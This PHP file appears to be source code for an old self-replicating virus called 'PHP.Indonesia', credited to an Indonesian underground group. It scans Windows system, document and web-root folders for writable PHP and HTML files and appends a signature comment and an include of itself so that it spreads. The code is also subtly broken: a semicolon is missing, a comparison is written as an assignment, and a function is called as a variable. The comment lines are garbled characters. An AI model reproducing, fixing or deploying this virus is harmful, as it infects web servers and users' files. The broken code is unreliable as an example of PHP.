<?php
// ##############################################################
// # PHP.Indonesia made for all Chicken looser ground the world #
// # By sevenC / N0:7                                           #
// # http://sevenc.vze.com                                      #
// # sevenC_zone@yahoo.com                                      #
// ##############################################################
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
$jawa = "indonesia.php\n";
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
$sumatra = "Wellcome to Indonesian PHPlovers.\n";
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
$kalimantan = $jawa . $sumatra;
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
echo	$kalimantan;
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
$all = opendir('C:\Windows\');
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
$all1 = opendir('C:\My Documents\');
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
$all2 = opendir('C:\InetPub\wwwRoot\');
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
$all3 = $all && $all1 && $all2
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
while ($file = readdir($all3))
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
{
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
	$inf = true;
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
	$exe = false;
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
	if ( ($exe = strstr ($file, '.php')) || ($exe = strstr ($file, '.html')) || ($exe = strstr ($file, '.htm')) || ($exe = strstr ($file, '.htt')) || ($exe = strstr ($file, '.php3')) )
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú	
        if ( is_file($file) && is_writeable($file) )
	{
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$new = fopen($file, "r");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$look = fread($new, filesize($file));
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$yes = strstr ($look, 'indonesia.php');
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		if (!$yes) $inf = false;
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
	}
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
	if ( ($inf=false) )
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
	{
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$new = fopen($file, "a");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, "<!-- ");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, "PHP.indonesia - ");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, "By sevenC / N0:7, ");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, "http://trax.to/sevenC, ");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
                $fputs($new, "sevenC_Zone@yahoo.com, ");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, "SECTORS UNDERGROUND TEAM (Indonesia)");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, "--->");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, "<?php ");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, "include(\"");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, __FILE__);
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, "\"); ");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		$fputs($new, "?>");
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
		return;
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
	}
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
}
// �~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú�~��D�}Ú
closedir($all3);
// PHP.Indonesia made for all Chicken looser ground the world
// By sevenC / N0:7
?>